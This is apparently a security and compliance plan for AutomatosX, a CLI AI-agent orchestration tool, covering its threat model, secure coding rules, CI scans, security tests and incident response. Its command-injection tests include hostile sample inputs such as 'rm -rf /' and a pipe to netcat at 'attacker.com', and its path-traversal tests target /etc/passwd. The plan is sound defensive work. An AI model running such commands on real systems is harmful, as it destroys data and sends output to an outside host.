# AutomatosX v4.0 Security & Compliance Plan

## Executive Summary

This document defines the comprehensive security and compliance strategy for AutomatosX v4.0, a CLI-based AI agent orchestration platform. Given the nature of AutomatosX as a tool that executes AI-generated commands, manages user data, and integrates with multiple AI providers, security is **critical and foundational**.

**Security Posture**: Defense-in-depth approach with multiple layers of protection
**Compliance Target**: Zero critical vulnerabilities at launch, ongoing security maintenance
**Risk Level**: High - CLI tools with command execution and file system access

**Critical Security Challenges**:
1. Command execution risks (provider CLI invocation)
2. File system access and path traversal
3. User data privacy (memory, workspaces)
4. API key and credential management
5. Dependency vulnerabilities
6. Input validation and injection attacks

---

## Security Integration Timeline

### Overview

Security is **integrated throughout development**, not a separate phase. This ensures security is built into the foundation, not bolted on at the end.

**Philosophy**:
- **Security by design** (not by audit) - Design with security in mind from day one
- **Shift security left** (early in development) - Find and fix issues early when they're cheaper to fix
- **Continuous security testing** - Test security in every sprint, not just before release
- **Defense in depth** - Multiple layers of security controls

**Key Principle**: Security is EVERYONE's responsibility, integrated into EVERY sprint.

### Security Activities by Sprint

This table maps all security activities to specific sprints, ensuring security is addressed continuously:

| Sprint | Week | Security Focus | Key Activities | Deliverables |
|--------|------|----------------|----------------|--------------|
| **1** | 1-2 | **Security Foundation** | Security tools setup, threat modeling, coding guidelines | Security tools configured, threat model v1.0, security champion identified |
| **2** | 3-4 | **Input Security** | Input validation design, command injection prevention, safe execution | Input validation comprehensive, command injection tests passing |
| **3** | 5-6 | **Data Security** | Memory storage security, file permissions, path traversal prevention | Secure file permissions (600/700), path traversal prevention verified |
| **4** | 7-8 | **Provider Security** | Provider authentication, API key handling, provider isolation, 1st audit | Provider security verified, first internal audit complete, Phase 1 gate passed |
| **5-6** | 9-12 | **Type Safety Security** | TypeScript strict mode, type-based validation, SAST integration, 3rd audit | Type safety enforced, SAST integrated, third audit complete |
| **7-8** | 13-16 | **CLI & Error Security** | Error message sanitization, log sanitization, CLI injection prevention, 4th audit | Logs sanitized, error messages safe, CLI secure, Phase 2 gate passed |
| **9-10** | 17-20 | **Performance vs Security** | Caching security, concurrency/race conditions, DoS prevention, 5th audit | Caching secure, no race conditions, DoS prevention implemented |
| **11-12** | 21-24 | **Professional Security** | **External audit**, penetration testing, vulnerability fixes, sign-off | **External audit PASSED**, all P0/P1 resolved, security sign-off, Phase 3 gate passed |
| **13-14** | 25-28 | **Final Security** | Final security review, pre-launch checklist, security documentation | All security gates passed, launch-ready |

### Continuous Security Activities

These security activities run **continuously** throughout development, not tied to specific sprints:

#### Every Sprint (Automated)
- **SAST (Static Analysis)**: ESLint security plugins, Semgrep, TypeScript strict mode
- **Dependency Scanning**: npm audit, Snyk, GitHub Dependabot
- **Secret Scanning**: git-secrets (pre-commit), GitHub secret scanning
- **Security Tests**: Automated security regression test suite in CI/CD

#### Every Sprint (Manual)
- **Security Code Review**: Every PR reviewed with security checklist
  - Input validation present?
  - Sensitive data logged?
  - Proper error handling?
  - Path traversal possible?
  - Command injection possible?
- **Security Gate Check**: Sprint deliverables include security tasks completed

#### Every Month (Internal Audits)
- **Sprint 1 (Week 2)**: Threat model validation
- **Sprint 4 (Week 8)**: First internal audit (Phase 1 foundation)
- **Sprint 6 (Week 12)**: Second internal audit (provider integration)
- **Sprint 8 (Week 16)**: Third internal audit (TypeScript migration)
- **Sprint 10 (Week 20)**: Fourth internal audit (CLI/error handling)
- **Sprint 12 (Week 24)**: Fifth internal audit (performance optimizations)

#### Every Phase (External Consultation)
- **Phase 0 (Week 6)**: Security design review with external consultant (optional)
- **Phase 1 (Week 8)**: Phase 1 security gate review
- **Phase 2 (Week 16)**: Phase 2 security gate review
- **Phase 3 (Week 22)**: **External professional security audit** (REQUIRED)
- **Phase 4 (Week 27)**: Final pre-launch security review

### Security Design Reviews (Before Implementation)

Design reviews happen BEFORE implementation to catch issues early:

| Sprint | Week | Design Review Focus | Duration | Participants |
|--------|------|---------------------|----------|-------------|
| 1 | 1 | Threat modeling workshop | Half day | All engineers + security champion |
| 2 | 3 | Input validation strategy | 2-4 hours | Lead engineer + security champion + 1 external (if available) |
| 3 | 5 | Memory storage security architecture | 2-4 hours | Lead engineer + security champion |
| 4 | 7 | Provider authentication and isolation | 2-4 hours | Lead engineer + security champion |
| 6 | 11 | TypeScript type system for security | 2 hours | Lead engineer + senior engineer |
| 8 | 15 | Error handling and information disclosure | 2-4 hours | Lead engineer + security champion |
| 10 | 19 | Performance optimizations security impact | 2-4 hours | Lead engineer + security champion |

**Design Review Process**:
1. **Before**: Prepare architecture diagrams and threat analysis
2. **During**: Review design for security flaws, identify risks
3. **After**: Document decisions, update threat model, create security tasks

### Security Code Reviews (During Implementation)

Every pull request includes security review:

**Security PR Checklist** (added 10-15 min per PR):
- [ ] **Input Validation**: All new inputs validated with Zod schemas?
- [ ] **Command Execution**: No `shell: true` or `exec()` used?
- [ ] **Path Handling**: All file paths validated and normalized?
- [ ] **Secrets**: No API keys, tokens, or passwords in code/logs?
- [ ] **Error Handling**: Error messages don't leak sensitive info?
- [ ] **Logging**: All logs sanitized (no secrets, no sensitive paths)?
- [ ] **Tests**: Security tests added for new security-critical code?

**Security Review Guidelines**:
- SAST must pass before merge (no P0/P1 findings)
- Security champion reviews all security-critical PRs
- Complex security changes require 2nd reviewer

### Security Testing Timeline

#### Unit Tests (Every Sprint)
- **Sprint 2+**: Input validation tests for every input
- **Sprint 2+**: Command injection attack tests
- **Sprint 3+**: Path traversal attack tests
- **Sprint 3+**: Memory security tests
- **Sprint 7+**: Error handling information leak tests

**Test Coverage Target**: >80% overall, 100% for security-critical paths

#### Integration Tests (Phase 2+)
- **Sprint 6+**: End-to-end security workflow tests
- **Sprint 8+**: Multi-provider security isolation tests
- **Sprint 10+**: Concurrent access security tests

#### Security-Specific Tests (Phase 3)
- **Sprint 11**: Penetration testing (external)
- **Sprint 11**: Fuzzing tests (CLI, config, provider responses)
- **Sprint 11**: Vulnerability scanning (comprehensive)
- **Sprint 12**: Security regression test suite (comprehensive)

### Security Audit Timeline

| Audit Type | When | Who | Scope | Outcome Required |
|------------|------|-----|-------|------------------|
| **Threat Model Review** | Week 1 | Team + Security Champion | Initial threat analysis | Threat model v1.0 approved |
| **Internal Audit #1** | Week 8 | Security Champion | Phase 1 foundation code | All P0/P1 findings resolved |
| **Internal Audit #2** | Week 12 | Security Champion | Provider integration | Security gates passed |
| **Internal Audit #3** | Week 16 | Security Champion | TypeScript migration | No security regressions |
| **Internal Audit #4** | Week 20 | Security Champion | CLI/error handling | Information disclosure prevented |
| **Internal Audit #5** | Week 24 | Security Champion | Performance code | No security impact from optimizations |
| **External Audit** | **Week 21-22** | **Professional Security Firm** | **Full system** | **All P0/P1 resolved before launch** |
| **Final Review** | Week 27 | All stakeholders | Complete system | Security sign-off for launch |

**External Audit Requirements** (Week 21-22):
- **Duration**: 2 weeks (160 hours)
- **Scope**: Full code review, penetration testing, vulnerability assessment
- **Deliverable**: Comprehensive audit report with severity-classified findings
- **Blocker**: Cannot launch without passing audit (all P0/P1 resolved)

### Security Gates (Blockers)

Security gates are **mandatory checkpoints** - development cannot proceed until passed:

#### Phase 1 Exit Gate (Week 8)
**Blocker**: Cannot start Phase 2 until ALL criteria met:
- [ ] Input validation comprehensive (all entry points)
- [ ] No command injection vulnerabilities (verified by tests)
- [ ] Path traversal prevented (all file operations)
- [ ] Secrets never logged (log sanitization verified)
- [ ] All SAST findings P0/P1 resolved
- [ ] First internal audit complete and passed

#### Phase 2 Exit Gate (Week 16)
**Blocker**: Cannot start Phase 3 until ALL criteria met:
- [ ] Type safety enforced (TypeScript strict mode)
- [ ] CLI injection prevented (tested)
- [ ] Error messages don't leak information (reviewed)
- [ ] Logs sanitized (no secrets, even in debug mode)
- [ ] All security tests passing (>80% coverage)
- [ ] SAST clean (no P0/P1 issues)

#### Phase 3 Exit Gate (Week 24)
**Blocker**: Cannot launch v4.0.0 until ALL criteria met:
- [ ] **External audit complete** (REQUIRED)
- [ ] **All P0 (critical) issues resolved** (ZERO tolerance)
- [ ] **All P1 (high) issues resolved** (ZERO tolerance)
- [ ] Penetration test passed (all attack vectors blocked)
- [ ] Security documentation complete and published
- [ ] Security test coverage >80%
- [ ] Dependency audit clean (0 critical/high CVEs)

#### Release Gate (Week 28)
**Blocker**: Cannot publish v4.0.0 to npm until ALL criteria met:
- [ ] Zero P0 (critical) vulnerabilities
- [ ] <5 P1 (high) vulnerabilities (with documented mitigation/acceptance)
- [ ] All security tests 100% passing
- [ ] Security documentation published
- [ ] Incident response plan ready
- [ ] Security sign-off from all stakeholders

### Security Metrics Tracking

Track these metrics throughout development:

#### Daily Metrics (Automated CI/CD)
- SAST scan results (pass/fail)
- Dependency vulnerabilities (count by severity)
- Security test pass rate (%)
- Secret scanning results (any secrets found?)

#### Sprint Metrics (Reviewed in sprint retrospective)
- Security tasks completed vs planned (%)
- Security findings by severity (P0/P1/P2/P3 count)
- Average time to fix security issues (by severity)
- Security test coverage (%)

#### Phase Metrics (Gate reviews)
- Total security findings resolved (count)
- Security gate criteria met (yes/no for each)
- Security debt (open P2/P3 issues count)
- Overall security posture score (1-10)

### Security Training & Knowledge Sharing

Security knowledge is shared throughout the team:

#### Week 1: Security Kickoff
- **Security coding guidelines training** (1 day, all engineers)
- Threat modeling workshop (half day)
- Security tools hands-on (ESLint security, git-secrets, etc.)
- Security champion role assignment

#### Monthly: Security Deep Dives
- Month 1 (Week 4): Input validation best practices
- Month 2 (Week 8): Secure command execution patterns
- Month 3 (Week 12): Type safety for security
- Month 4 (Week 16): Error handling and information disclosure
- Month 5 (Week 20): DoS prevention and rate limiting
- Month 6 (Week 24): External audit lessons learned

#### Weekly: Security in Sprint Planning
- Review security tasks for upcoming sprint (15 min)
- Assign security code review responsibilities
- Discuss any security concerns or questions

### Key Takeaways

1. **Security starts Day 1** - Sprint 1 includes security foundation
2. **Security in every sprint** - Not just Sprint 11-12
3. **Shift left** - Design reviews before implementation
4. **Continuous testing** - Security tests run in every sprint
5. **Multiple audits** - Internal monthly + external (Week 21-22)
6. **Mandatory gates** - Cannot proceed without passing security gates
7. **Team responsibility** - Everyone writes secure code, not just security team

**Updated Timeline**: Security now integrated from Sprint 1 → Sprint 14 (not just Sprint 11-12)

---

## Security Architecture

### Multi-Layer Security Model

```
┌─────────────────────────────────────────────────────────┐
│                   Layer 1: Input Layer                   │
│  - Input validation and sanitization                     │
│  - Command injection prevention                          │
│  - Path traversal protection                             │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│                Layer 2: Execution Layer                  │
│  - Sandboxed workspace execution                         │
│  - Safe command execution (no shell=true)                │
│  - Provider CLI isolation                                │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│                Layer 3: Data Layer                       │
│  - Encrypted memory storage (optional)                   │
│  - Secure file permissions                               │
│  - No secrets in logs or memory                          │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│              Layer 4: Dependency Layer                   │
│  - Regular dependency audits                             │
│  - Automated vulnerability scanning                      │
│  - Minimal dependency philosophy                         │
└─────────────────────────────────────────────────────────┘
```

### Security Principles

1. **Least Privilege**: Only request necessary permissions
2. **Defense in Depth**: Multiple layers of security controls
3. **Fail Secure**: Default to secure state on errors
4. **Zero Trust**: Validate all inputs, never assume safety
5. **Privacy by Design**: Minimize data collection and retention
6. **Transparency**: Clear documentation of security practices

---

## Threat Model

### Attack Surface Analysis

#### 1. CLI Command Interface

**Attack Vectors**:
- Command injection via malformed arguments
- Path traversal via file path arguments
- Environment variable manipulation
- Shell metacharacter injection

**Threat Actors**:
- Malicious users (intentional)
- Compromised scripts (unintentional)
- AI-generated malicious commands (novel)

**Impact**: High - Direct system access

#### 2. Provider Integration

**Attack Vectors**:
- Provider CLI vulnerabilities
- Man-in-the-middle attacks
- API credential theft
- Response injection (AI output contains malicious code)

**Threat Actors**:
- Compromised provider accounts
- Network attackers
- Malicious AI responses

**Impact**: High - Credential theft, data exfiltration

#### 3. File System Access

**Attack Vectors**:
- Path traversal (../../etc/passwd)
- Symbolic link attacks
- Race conditions (TOCTOU)
- Unauthorized directory access

**Threat Actors**:
- Local malicious users
- Malicious agent profiles
- Compromised workspaces

**Impact**: High - Arbitrary file read/write

#### 4. Memory System

**Attack Vectors**:
- Memory injection (malicious vectors)
- Data poisoning (corrupted embeddings)
- Privacy leaks (sensitive data in memory)
- Unauthorized memory access

**Threat Actors**:
- Malicious agents
- Compromised dependencies
- Data extraction attacks

**Impact**: Medium - Data leakage

#### 5. Configuration System

**Attack Vectors**:
- Config file tampering
- Malicious provider configurations
- Path injection in configs
- JSON/YAML parsing vulnerabilities

**Threat Actors**:
- Local attackers
- Malicious config files
- Supply chain attacks

**Impact**: High - System compromise

#### 6. Dependencies

**Attack Vectors**:
- Known CVEs in dependencies
- Malicious package injection
- Typosquatting
- Dependency confusion

**Threat Actors**:
- Supply chain attackers
- Compromised maintainers
- Nation-state actors

**Impact**: Critical - Full system compromise

### STRIDE Threat Analysis

| Threat Type | Examples | Mitigation |
|-------------|----------|------------|
| **Spoofing** | Fake provider responses | Verify provider authenticity |
| **Tampering** | Modified config files | File integrity checks |
| **Repudiation** | Denied malicious actions | Audit logging (opt-in) |
| **Information Disclosure** | Memory leaks, log leaks | Sanitize logs, encrypt memory |
| **Denial of Service** | Resource exhaustion | Rate limiting, timeouts |
| **Elevation of Privilege** | Command injection | Input validation, sandboxing |

### Risk Matrix

| Threat | Likelihood | Impact | Risk Level | Priority |
|--------|-----------|--------|-----------|----------|
| Command Injection | Medium | Critical | **High** | P0 |
| Path Traversal | High | High | **High** | P0 |
| Dependency CVE | High | High | **High** | P0 |
| API Key Theft | Medium | Critical | **High** | P0 |
| Memory Poisoning | Low | Medium | **Low** | P2 |
| Config Tampering | Medium | High | **Medium** | P1 |
| DoS (Resource) | Medium | Low | **Low** | P2 |
| Privacy Leak | Medium | Medium | **Medium** | P1 |

---

## Security Requirements

### SR-1: Input Validation

**Requirement**: All user inputs MUST be validated before processing.

**Implementation**:

```typescript
// Input validation using Zod schemas
import { z } from 'zod';

const CommandArgsSchema = z.object({
  agent: z.string().regex(/^[a-z0-9-]+$/), // Only alphanumeric and hyphens
  task: z.string().max(10000), // Reasonable length limit
  workspace: z.string().regex(/^[a-zA-Z0-9-_]+$/), // No path traversal
  memory: z.boolean().optional(),
});

// Validate before execution
function validateInput(input: unknown) {
  try {
    return CommandArgsSchema.parse(input);
  } catch (error) {
    throw new SecurityError('Invalid input', { cause: error });
  }
}
```

**Validation Rules**:
- Agent names: `/^[a-z0-9-]+$/` (no special chars)
- File paths: Must be within allowed directories
- Commands: No shell metacharacters (`|`, `&`, `;`, etc.)
- JSON configs: Schema validation with size limits
- URLs: Strict URL parsing, no `file://` protocol

### SR-2: Command Execution Safety

**Requirement**: Provider CLI execution MUST be safe from command injection.

**Implementation**:

```typescript
import { spawn } from 'child_process';

// SAFE: Array-based arguments, no shell
function executeProvider(provider: string, args: string[]): Promise<string> {
  // Validate provider is in allowlist
  if (!ALLOWED_PROVIDERS.includes(provider)) {
    throw new SecurityError(`Provider not allowed: ${provider}`);
  }

  // NEVER use shell: true
  const child = spawn(provider, args, {
    shell: false, // CRITICAL: Prevents shell injection
    timeout: 120000, // Prevent infinite execution
    maxBuffer: 10 * 1024 * 1024, // 10MB max output
    env: sanitizeEnvironment(process.env), // Clean environment
  });

  // ... handle execution
}

// UNSAFE: DO NOT USE
// exec(`${provider} ${args.join(' ')}`); // VULNERABLE
```

**Safety Rules**:
- ❌ NEVER use `child_process.exec()` or `shell: true`
- ✅ ALWAYS use `child_process.spawn()` with array args
- ✅ ALWAYS validate provider binary is in allowlist
- ✅ ALWAYS set timeouts and resource limits
- ✅ ALWAYS sanitize environment variables

### SR-3: Path Traversal Prevention

**Requirement**: All file paths MUST be validated to prevent traversal attacks.

**Implementation**:

```typescript
import path from 'path';
import { realpath } from 'fs/promises';

const ALLOWED_BASE_DIRS = [
  path.join(os.homedir(), '.automatosx'),
  // Add other allowed directories
];

async function validatePath(userPath: string): Promise<string> {
  // Resolve to absolute path
  const absolutePath = path.resolve(userPath);

  // Get canonical path (resolves symlinks)
  const canonicalPath = await realpath(absolutePath).catch(() => absolutePath);

  // Check if within allowed directories
  const isAllowed = ALLOWED_BASE_DIRS.some(baseDir =>
    canonicalPath.startsWith(baseDir)
  );

  if (!isAllowed) {
    throw new SecurityError(`Path not allowed: ${canonicalPath}`);
  }

  // Additional checks
  if (canonicalPath.includes('..')) {
    throw new SecurityError('Path traversal detected');
  }

  return canonicalPath;
}
```

**Protection Mechanisms**:
- Allowlist-based directory access
- Canonical path resolution (prevents symlink attacks)
- Path component validation (no `..`, `.`)
- Strict path normalization

### SR-4: Secrets Management

**Requirement**: No secrets (API keys, credentials) in code, logs, or memory.

**Implementation**:

```typescript
// Secrets detection in logs
function sanitizeLog(message: string): string {
  const patterns = [
    /sk-[a-zA-Z0-9]{32,}/, // OpenAI API keys
    /sk-ant-[a-zA-Z0-9]{32,}/, // Anthropic API keys
    /AIza[a-zA-Z0-9-_]{35}/, // Google API keys
    /Bearer\s+[a-zA-Z0-9-._~+/]+=*/, // Bearer tokens
    /password["\s:=]+[^\s"]+/i, // Passwords
  ];

  let sanitized = message;
  patterns.forEach(pattern => {
    sanitized = sanitized.replace(pattern, '[REDACTED]');
  });

  return sanitized;
}

// Environment variable sanitization
function sanitizeEnvironment(env: NodeJS.ProcessEnv): NodeJS.ProcessEnv {
  const safe: NodeJS.ProcessEnv = {};
  const allowedKeys = ['PATH', 'HOME', 'USER', 'LANG', 'TERM'];

  for (const key of allowedKeys) {
    if (env[key]) {
      safe[key] = env[key];
    }
  }

  return safe;
}
```

**Secret Handling Rules**:
- ❌ NEVER log API keys or tokens
- ❌ NEVER store secrets in code or configs
- ❌ NEVER pass secrets in command-line args (visible in `ps`)
- ✅ Rely on provider CLIs for authentication (they handle secrets)
- ✅ Sanitize all log output
- ✅ Clear sensitive data from memory after use

### SR-5: Memory Storage Security

**Requirement**: User memory data MUST be protected from unauthorized access.

**Implementation**:

```typescript
// File permissions for memory storage
async function createSecureMemoryFile(path: string): Promise<void> {
  // Create with restrictive permissions (600 = owner read/write only)
  await fs.writeFile(path, '', { mode: 0o600 });
}

// Optional: Encryption at rest
async function encryptMemory(data: MemoryEntry[]): Promise<Buffer> {
  // Only if user opts in (adds complexity)
  if (config.memory.encryption.enabled) {
    const key = await getEncryptionKey(); // From OS keychain
    return encrypt(JSON.stringify(data), key);
  }
  return Buffer.from(JSON.stringify(data));
}
```

**Protection Mechanisms**:
- File permissions: 600 (owner only)
- Directory permissions: 700 (owner only)
- Optional encryption at rest (opt-in)
- Secure deletion of old entries
- No sensitive data in vector embeddings

### SR-6: Dependency Security

**Requirement**: All dependencies MUST be regularly audited and updated.

**Implementation**:

```json
// package.json scripts
{
  "scripts": {
    "audit": "npm audit --audit-level=moderate",
    "audit:fix": "npm audit fix",
    "audit:check": "npm audit --audit-level=critical --json | grep -q '\"vulnerabilities\":{\"critical\":0,\"high\":0}' || exit 1",
    "deps:check": "npm outdated",
    "deps:update": "npm update"
  }
}
```

**Audit Process**:
1. **Daily**: Automated npm audit in CI
2. **Weekly**: Dependency update review
3. **Monthly**: Manual security review
4. **Immediate**: Critical CVE response

---

## Secure Coding Guidelines

### SG-1: Input Validation

**Rule**: Validate all inputs at boundaries.

**Examples**:

```typescript
// ✅ GOOD: Whitelist validation
function validateAgentName(name: string): boolean {
  return /^[a-z0-9-]+$/.test(name) && name.length > 0 && name.length < 50;
}

// ❌ BAD: Blacklist validation (incomplete)
function validateAgentName(name: string): boolean {
  return !name.includes('/'); // What about other chars?
}
```

### SG-2: Safe Command Execution

**Rule**: Never use shell execution.

```typescript
// ✅ GOOD: spawn with array args
spawn('claude', ['--prompt', userInput], { shell: false });

// ❌ BAD: shell execution
exec(`claude --prompt "${userInput}"`); // Vulnerable to injection
```

### SG-3: Path Handling

**Rule**: Always normalize and validate paths.

```typescript
// ✅ GOOD: Validate before use
const safePath = await validatePath(userPath);
await fs.readFile(safePath);

// ❌ BAD: Direct use of user input
await fs.readFile(userPath); // Vulnerable to traversal
```

### SG-4: Error Handling

**Rule**: Never leak sensitive information in errors.

```typescript
// ✅ GOOD: Generic error message
catch (error) {
  logger.error('Operation failed', { context: sanitize(error) });
  throw new Error('Failed to execute command');
}

// ❌ BAD: Leaks internal paths
catch (error) {
  throw new Error(`Failed: ${error.message} at ${error.stack}`);
}
```

### SG-5: Logging

**Rule**: Sanitize all log output.

```typescript
// ✅ GOOD: Sanitized logging
logger.info('Provider response', { content: sanitizeLog(response) });

// ❌ BAD: Raw logging
logger.info('Provider response', { content: response }); // May contain secrets
```

### SG-6: Data Handling

**Rule**: Minimize data retention and access.

```typescript
// ✅ GOOD: Clear sensitive data after use
const result = await provider.execute(prompt);
// ... use result ...
result = null; // Clear reference

// ❌ BAD: Keep in memory indefinitely
this.cache.set('result', result); // Persists in memory
```

---

## Security Testing Plan

### 1. Static Application Security Testing (SAST)

**Tools**:
- **ESLint Security Plugin**: `eslint-plugin-security`
- **TypeScript**: Strict mode, no `any` types
- **Semgrep**: Custom security rules

**Implementation**:

```yaml
# .github/workflows/security-sast.yml
name: SAST

on: [push, pull_request]

jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: ESLint Security
        run: |
          npm install
          npm run lint:security

      - name: TypeScript Check
        run: npm run typecheck

      - name: Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: p/security-audit
```

**Rules to Enforce**:
- No `eval()` or `Function()` constructor
- No `child_process.exec()` or `shell: true`
- No hardcoded secrets
- No SQL injection patterns
- No path traversal patterns

### 2. Dynamic Application Security Testing (DAST)

**Test Scenarios**:

```typescript
// tests/security/command-injection.test.ts
describe('Command Injection Prevention', () => {
  it('should reject shell metacharacters', async () => {
    const malicious = 'task; rm -rf /';
    await expect(executeTask(malicious)).rejects.toThrow('Invalid input');
  });

  it('should reject command chaining', async () => {
    const malicious = 'task && malicious-command';
    await expect(executeTask(malicious)).rejects.toThrow('Invalid input');
  });

  it('should reject pipe commands', async () => {
    const malicious = 'task | nc attacker.com 1234';
    await expect(executeTask(malicious)).rejects.toThrow('Invalid input');
  });
});

// tests/security/path-traversal.test.ts
describe('Path Traversal Prevention', () => {
  it('should reject parent directory traversal', async () => {
    const malicious = '../../etc/passwd';
    await expect(readFile(malicious)).rejects.toThrow('Path not allowed');
  });

  it('should reject absolute paths outside allowed dirs', async () => {
    const malicious = '/etc/passwd';
    await expect(readFile(malicious)).rejects.toThrow('Path not allowed');
  });

  it('should reject symlink attacks', async () => {
    // Create symlink to /etc/passwd
    await fs.symlink('/etc/passwd', '.automatosx/link');
    await expect(readFile('.automatosx/link')).rejects.toThrow('Path not allowed');
  });
});
```

### 3. Dependency Vulnerability Scanning

**Automated Scanning**:

```yaml
# .github/workflows/security-deps.yml
name: Dependency Security

on:
  schedule:
    - cron: '0 0 * * *' # Daily at midnight
  push:
    branches: [main]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: npm audit
        run: npm audit --audit-level=moderate

      - name: Snyk Security Scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

      - name: OWASP Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 'AutomatosX'
          format: 'HTML'
          args: '--enableExperimental'
```

### 4. Penetration Testing

**Phase 0 (Spike) - Week 6**:
- Internal security review
- Threat model validation
- Basic security testing

**Phase 2 (Modernization) - Week 16**:
- Internal penetration testing
- Security audit of core components
- Fix identified issues

**Phase 4 (Polish) - Week 24**:
- External security audit (recommended)
- Final penetration testing
- Security sign-off for launch

**Test Scenarios**:
1. **Command Injection**:
   - Attempt shell metacharacter injection
   - Test argument manipulation
   - Environment variable injection

2. **Path Traversal**:
   - Directory traversal attempts
   - Symlink attacks
   - Race condition (TOCTOU) attacks

3. **API Security**:
   - Provider credential theft attempts
   - Response injection
   - Man-in-the-middle attacks (if applicable)

4. **Data Security**:
   - Memory file permission checks
   - Config file tampering
   - Workspace isolation bypass

5. **DoS Attacks**:
   - Resource exhaustion
   - Infinite loops
   - Memory bombs

### 5. Fuzzing

**Fuzzing Targets**:
- CLI argument parsing
- Config file parsing
- Provider response handling
- Memory search queries

**Implementation**:

```typescript
// tests/security/fuzzing.test.ts
import { fuzz } from 'fuzzing-library';

describe('Fuzzing Tests', () => {
  it('should handle malformed CLI args', async () => {
    const inputs = fuzz.generateStrings(1000, { special: true });

    for (const input of inputs) {
      // Should not crash, either succeed or throw valid error
      await expect(
        parseCliArgs(input)
      ).resolves.toBeDefined()
        .or.rejects.toThrow(Error);
    }
  });

  it('should handle malformed configs', async () => {
    const configs = fuzz.generateJSON(100);

    for (const config of configs) {
      // Should validate or reject cleanly
      await expect(
        validateConfig(config)
      ).resolves.toBeDefined()
        .or.rejects.toThrow(ValidationError);
    }
  });
});
```

---

## Security Audit Schedule

### Audit Cadence

| Phase | Week | Audit Type | Scope | Owner |
|-------|------|------------|-------|-------|
| Phase 0 | Week 6 | Internal Review | Threat model, design | Lead Engineer |
| Phase 1 | Week 12 | Code Review | Foundation components | Security Lead |
| Phase 2 | Week 16 | Internal Pentest | Core features | External Consultant |
| Phase 3 | Week 20 | Dependency Audit | npm packages | Automated + Manual |
| Phase 4 | Week 24 | External Audit | Full system | External Security Firm |
| Pre-Launch | Week 27 | Final Review | All components | All team |
| Post-Launch | Ongoing | Continuous | Dependencies, CVEs | Automated |

### Audit Checklist

**Pre-Audit Preparation**:
- [ ] Code freeze for audit period
- [ ] Threat model updated
- [ ] Test coverage > 80%
- [ ] All known issues documented
- [ ] Security requirements documented

**During Audit**:
- [ ] Code review (all security-critical paths)
- [ ] Configuration review
- [ ] Dependency analysis
- [ ] Penetration testing
- [ ] Documentation review

**Post-Audit**:
- [ ] All findings documented
- [ ] Severity classification (P0-P4)
- [ ] Remediation plan created
- [ ] Fixes implemented and tested
- [ ] Re-audit if critical issues found

### Security Review Gates

**Gate 1: Design Review (Week 6)**
- [ ] Threat model approved
- [ ] Security architecture reviewed
- [ ] No critical design flaws
- **Blocker**: Cannot proceed without approval

**Gate 2: Implementation Review (Week 16)**
- [ ] SAST passes with no critical issues
- [ ] Input validation comprehensive
- [ ] Command execution safe
- [ ] Path handling secure
- **Blocker**: Cannot merge to main without passing

**Gate 3: Security Audit (Week 24)**
- [ ] External audit complete
- [ ] All P0 issues resolved
- [ ] All P1 issues resolved or accepted
- [ ] Security sign-off obtained
- **Blocker**: Cannot launch without approval

**Gate 4: Pre-Launch Review (Week 27)**
- [ ] All security tests passing
- [ ] No known critical vulnerabilities
- [ ] Dependency audit clean
- [ ] Documentation complete
- **Blocker**: Cannot release without approval

---

## Incident Response Plan

### Severity Classification

| Severity | Definition | Response Time | Example |
|----------|-----------|--------------|---------|
| **P0 - Critical** | Remote code execution, data breach | < 4 hours | Command injection vulnerability |
| **P1 - High** | Privilege escalation, DoS | < 24 hours | Path traversal allowing file read |
| **P2 - Medium** | Information disclosure | < 7 days | API key leak in logs |
| **P3 - Low** | Minor security issue | < 30 days | Weak file permissions |
| **P4 - Info** | Security improvement | As needed | Use stronger encryption |

### Incident Response Process

#### 1. Detection

**Sources**:
- Security audit findings
- User reports (GitHub issues, security@)
- Automated vulnerability scans
- CVE notifications
- Bug bounty reports (if applicable)

**Triage**:
1. Assess severity (P0-P4)
2. Determine exploitability
3. Estimate impact
4. Assign owner

#### 2. Containment

**P0 - Critical** (< 4 hours):
```
1. Immediate Actions (< 1 hour):
   - Confirm vulnerability
   - Notify team lead
   - Create private security advisory on GitHub
   - Assess blast radius

2. Short-term Containment (< 4 hours):
   - Develop hotfix
   - Test hotfix
   - Prepare release notes
```

**P1 - High** (< 24 hours):
```
1. Immediate Actions (< 4 hours):
   - Confirm vulnerability
   - Assess exploitability
   - Create private tracking issue

2. Short-term Containment (< 24 hours):
   - Develop fix
   - Test fix
   - Prepare patch release
```

#### 3. Eradication

**Fix Development**:
```typescript
// 1. Create security fix branch
git checkout -b security/fix-CVE-2025-XXXX

// 2. Implement fix
// ... code changes ...

// 3. Add security test
describe('Security: CVE-2025-XXXX', () => {
  it('should prevent exploit', async () => {
    // Test that exploit is blocked
  });
});

// 4. Test thoroughly
npm run test:security
npm run test:all

// 5. Code review (security lead)
// 6. Merge to main (after approval)
```

**Release Process**:
```bash
# 1. Version bump (patch)
npm version patch -m "Security fix: CVE-2025-XXXX"

# 2. Publish to npm
npm publish

# 3. Create GitHub release with security advisory
gh release create vX.Y.Z --notes "Security fix for CVE-2025-XXXX"

# 4. Publish security advisory
gh security-advisory publish --id GHSA-XXXX
```

#### 4. Recovery

**Communication Plan**:

1. **Internal** (Immediate):
   - Notify all team members
   - Document in incident log
   - Update security tracking

2. **Users** (< 24 hours for P0, < 7 days for P1):
   ```markdown
   # Security Advisory: AutomatosX vX.Y.Z

   **Severity**: Critical/High/Medium/Low
   **CVE ID**: CVE-2025-XXXX
   **Affected Versions**: vX.Y.Z - vA.B.C
   **Fixed in**: vX.Y.Z+1

   ## Summary
   [Brief description of vulnerability]

   ## Impact
   [What attackers could do]

   ## Mitigation
   Upgrade immediately:
   ```bash
   npm install -g automatosx@latest
   ```

   ## Workaround
   [If urgent upgrade not possible]

   ## Timeline
   - Discovered: YYYY-MM-DD
   - Fixed: YYYY-MM-DD
   - Disclosed: YYYY-MM-DD

   ## Credits
   Thanks to [researcher] for responsible disclosure.
   ```

3. **Public** (After fix deployed):
   - GitHub Security Advisory
   - Release notes
   - Blog post (for critical issues)
